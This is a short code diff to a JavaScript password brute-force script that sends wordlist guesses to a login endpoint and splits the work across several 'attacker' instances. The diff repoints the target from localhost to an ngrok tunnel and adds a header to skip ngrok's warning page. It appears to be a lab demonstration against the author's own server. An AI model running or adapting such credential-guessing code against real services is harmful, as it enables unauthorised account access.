@@ -10,7 +10,7 @@ const LOG_EVERY = 200;
 // ─────────────────────────────────────────────
 const TOTAL_ATTACKERS = parseInt(process.env.TOTAL_ATTACKERS ?? "1");
 const ATTACKER_INDEX  = parseInt(process.env.ATTACKER_INDEX  ?? "0");
-const SERVER_URL      = process.env.SERVER_URL  || "http://localhost:3000/login";
+const SERVER_URL      = process.env.SERVER_URL  || "https://c772-2804-14c-da98-81df-35e3-2524-8030-5ada.ngrok-free.app/login";
 const ATTACKER_ID     = process.env.ATTACKER_ID || "local";
 const WORDLIST_PATH   = process.env.WORDLIST_PATH || path.join(__dirname, "wordlist.txt");
 
@@ -120,7 +120,10 @@ function sleep(ms) {
 async function tryLogin(password) {
   const response = await fetch(SERVER_URL, {
     method: "POST",
-    headers: { "Content-Type": "application/json" },
+    headers: {
+      "Content-Type": "application/json",
+      "ngrok-skip-browser-warning": "true"
+    },
     body: JSON.stringify({ username: USERNAME, password })
   });
   const data = await response.json();
